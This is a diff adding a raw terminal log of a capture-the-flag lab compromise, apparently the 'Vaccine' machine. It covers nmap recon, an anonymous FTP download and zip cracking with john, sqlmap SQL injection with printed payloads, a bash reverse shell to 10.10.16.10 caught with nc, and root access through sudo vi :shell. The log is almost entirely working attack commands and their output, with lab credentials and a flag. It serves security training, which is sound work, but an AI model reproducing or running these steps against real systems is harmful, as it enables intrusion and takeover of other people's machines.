@@ -1,0 +1,252 @@
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# nmap -sCV -T4 10.129.122.26
+  Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-05 17:26 -05
+  Nmap scan report for 10.129.122.26
+  Host is up (0.19s latency).
+  Not shown: 997 closed tcp ports (reset)
+  PORT   STATE SERVICE VERSION
+  21/tcp open  ftp     vsftpd 3.0.3
+  | ftp-syst: 
+  |   STAT: 
+  | FTP server status:
+  |      Connected to ::ffff:10.10.16.10
+  |      Logged in as ftpuser
+  |      TYPE: ASCII
+  |      No session bandwidth limit
+  |      Session timeout in seconds is 300
+  |      Control connection is plain text
+  |      Data connections will be plain text
+  |      At session startup, client count was 4
+  |      vsFTPd 3.0.3 - secure, fast, stable
+  |_End of status
+  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
+  |_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+  22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+  | ssh-hostkey: 
+  |   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+  |   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+  |_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+  |_http-title: MegaCorp Login
+  | http-cookie-flags: 
+  |   /: 
+  |     PHPSESSID: 
+  |_      httponly flag not set
+  |_http-server-header: Apache/2.4.41 (Ubuntu)
+  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+  
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 29.63 seconds
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# ftp anonymous@10.129.122.26
+  Connected to 10.129.122.26.
+  220 (vsFTPd 3.0.3)
+  331 Please specify the password.
+  Password: 
+  230 Login successful.
+  Remote system type is UNIX.
+  Using binary mode to transfer files.
+ftp> ls
+  229 Entering Extended Passive Mode (|||10864|)
+  150 Here comes the directory listing.
+  -rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
+  226 Directory send OK.
+ftp> get backup.zip
+  local: backup.zip remote: backup.zip
+  229 Entering Extended Passive Mode (|||10364|)
+  150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+  100% |**************************************************************************************************************************|  2533       24.83 KiB/s    00:00 ETA
+  226 Transfer complete.
+  2533 bytes received in 00:00 (5.61 KiB/s)
+ftp> exit
+  221 Goodbye.
+
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+  Using default input encoding: UTF-8
+  Loaded 1 password hash (PKZIP [32/64])
+  No password hashes left to crack (see FAQ)
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# john --show zip.hash
+  backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
+
+1 password hash cracked, 0 left
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# unzip backup
+  Archive:  backup.zip
+  [backup.zip] index.php password: 
+    inflating: index.php               
+    inflating: style.css   
+
+
+user: admin
+pass: 	qwerty789
+
+--Burpsuite 
+GET /dashboard.php HTTP/1.1
+Host: 10.129.122.26
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: PHPSESSID=1die8s1iaaa092t23but0eugjk
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# sqlmap -u 'http://10.129.154.39/dashboard.php?search=test' --cookie='PHPSESSID=r4dov6p25nqn5ouilhtlf8325p' --os-shell                                              
+        ___
+       __H__                                                                                                                                                           
+ ___ ___[.]_____ ___ ___  {1.9.2#stable}                                                                                                                               
+|_ -| . [.]     | .'| . |                                                                                                                                              
+|___|_  [.]_|_|_|__,|  _|                                                                                                                                              
+      |_|V...       |_|   https://sqlmap.org                                                                                                                           
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:47:12 /2025-05-05/
+
+[18:47:12] [INFO] testing connection to the target URL
+[18:47:13] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:47:14] [INFO] testing if the target URL content is stable
+[18:47:14] [INFO] target URL content is stable
+[18:47:14] [INFO] testing if GET parameter 'search' is dynamic
+[18:47:16] [WARNING] GET parameter 'search' does not appear to be dynamic
+[18:47:17] [INFO] heuristic (basic) test shows that GET parameter 'search' might be injectable (possible DBMS: 'PostgreSQL')
+[18:47:17] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
+[18:47:17] [INFO] testing for SQL injection on GET parameter 'search'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] n
+[18:47:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:47:34] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[18:47:35] [INFO] testing 'Generic inline queries'
+[18:47:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[18:47:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[18:47:38] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)                                                             
+[18:47:43] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[18:47:55] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+[18:47:55] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[18:47:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[18:47:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[18:47:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[18:47:57] [WARNING] reflective value(s) found and filtering out
+[18:48:01] [INFO] target URL appears to have 5 columns in query
+[18:48:02] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=test';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=test' UNION ALL SELECT NULL,NULL,NULL,(CHR(113)||CHR(122)||CHR(113)||CHR(112)||CHR(113))||(CHR(115)||CHR(118)||CHR(110)||CHR(110)||CHR(72)||CHR(111)||CHR(79)||CHR(90)||CHR(71)||CHR(86)||CHR(101)||CHR(112)||CHR(116)||CHR(100)||CHR(65)||CHR(120)||CHR(107)||CHR(85)||CHR(101)||CHR(119)||CHR(68)||CHR(121)||CHR(103)||CHR(84)||CHR(84)||CHR(76)||CHR(116)||CHR(83)||CHR(117)||CHR(102)||CHR(76)||CHR(77)||CHR(100)||CHR(102)||CHR(88)||CHR(108)||CHR(66)||CHR(113)||CHR(89)||CHR(122))||(CHR(113)||CHR(122)||CHR(118)||CHR(106)||CHR(113)),NULL-- QMwx
+---
+[18:48:10] [INFO] the back-end DBMS is PostgreSQL
+web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (focal or eoan)
+web application technology: Apache 2.4.41
+back-end DBMS: PostgreSQL
+[18:48:19] [INFO] fingerprinting the back-end DBMS operating system
+[18:48:23] [INFO] the back-end DBMS operating system is Linux
+[18:48:23] [INFO] testing if current user is DBA
+[18:48:24] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[18:48:24] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> bash -c "bash -i >& /dev/tcp/10.10.16.10/443 0>&1"
+do you want to retrieve the command standard output? [Y/n/a] y
+[18:53:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+
+-We have to work with a listener 
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.16.10] from (UNKNOWN) [10.129.154.39] 56702
+bash: cannot set terminal process group (1491): Inappropriate ioctl for device
+bash: no job control in this shell
+┌──(root㉿sebas)-[/home/sebastianrojas]
+└─# nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.16.10] from (UNKNOWN) [10.129.154.39] 56862
+bash: cannot set terminal process group (1755): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ cd ..
+cd ..
+postgres@vaccine:/var/lib/postgresql/11$ cd ..
+cd ..
+postgres@vaccine:/var/lib/postgresql$ ls
+ls
+11
+user.txt
+postgres@vaccine:/var/lib/postgresql$ cd /var/www/
+cd /var/www/
+postgres@vaccine:/var/www$ ls
+ls
+html
+postgres@vaccine:/var/www$ cd html      
+cd html
+postgres@vaccine:/var/www/html$ ls
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+postgres@vaccine:/var/www/html$ cat dashboard.php | grep "pass"
+cat dashboard.php | grep "pass"
+          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+
+──(root㉿sebas)-[/home/sebastianrojas]
+└─# ssh postgres@10.129.154.39                                                                                                                                         
+The authenticity of host '10.129.154.39 (10.129.154.39)' can't be established.
+ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yez
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added '10.129.154.39' (ED25519) to the list of known hosts.
+postgres@10.129.154.39's password: 
+Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue 06 May 2025 05:05:33 AM UTC
+
+  System load:  0.0               Processes:             188
+  Usage of /:   32.6% of 8.73GB   Users logged in:       0
+  Memory usage: 19%               IP address for ens160: 10.129.154.39
+  Swap usage:   0%
+
+
+0 updates can be installed immediately.
+0 of these updates are security updates.
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+postgres@vaccine:/bin$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:shell
+
+root@vaccine:/usr/bin# cd /root
+root@vaccine:~# cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+root@vaccine:~# 
+
+
